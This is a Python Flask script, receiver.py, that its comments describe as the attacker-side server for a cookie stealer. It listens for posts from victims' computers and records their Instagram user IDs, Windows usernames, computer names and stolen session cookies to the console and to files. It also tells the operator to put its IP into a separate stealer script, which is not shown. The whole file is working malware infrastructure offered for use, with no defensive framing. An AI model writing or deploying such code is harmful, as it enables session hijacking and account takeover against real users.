# ===== FILE: receiver.py =====
# This runs on YOUR laptop (the attacker machine)
# It listens for incoming cookies from the victim's computer

from flask import Flask, request
import json
from datetime import datetime

app = Flask(__name__)

# When the victim's computer sends cookies, they arrive here
@app.route('/steal', methods=['POST'])
def steal():
    # Get the data the victim sent
    data = request.json
    
    # Get the victim's info from the data
    victim_id = data.get('username', 'unknown')
    cookies = data.get('cookies', {})
    computer_name = data.get('computer', 'unknown')
    victim_user = data.get('victim_user', 'unknown')
    
    # Print to screen so you see it immediately
    print("\n" + "="*60)
    print(f"[+] COOKIES STOLEN at {datetime.now()}")
    print(f"[+] Computer: {computer_name}")
    print(f"[+] Windows User: {victim_user}")
    print(f"[+] Instagram User ID: {victim_id}")
    print(f"[+] Cookies: {json.dumps(cookies, indent=2)}")
    print("="*60 + "\n")
    
    # Save to a text file so you have a permanent record
    filename = f"stolen_cookies_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    with open(filename, 'w') as f:
        f.write(f"Computer: {computer_name}\n")
        f.write(f"Windows User: {victim_user}\n")
        f.write(f"Instagram User ID: {victim_id}\n")
        f.write(f"Time: {datetime.now()}\n")
        f.write(f"\nCookies:\n")
        for name, value in cookies.items():
            f.write(f"{name} = {value}\n")
    
    print(f"[+] Saved to file: {filename}")
    
    # Return success to the victim's computer
    return 'OK', 200

if __name__ == '__main__':
    print("="*60)
    print("  RECEIVER SERVER RUNNING")
    print("  Waiting for victim cookies...")
    print("  Make sure this IP is set in the stealer script!")
    print("="*60)
    app.run(host='0.0.0.0', port=8082, debug=False)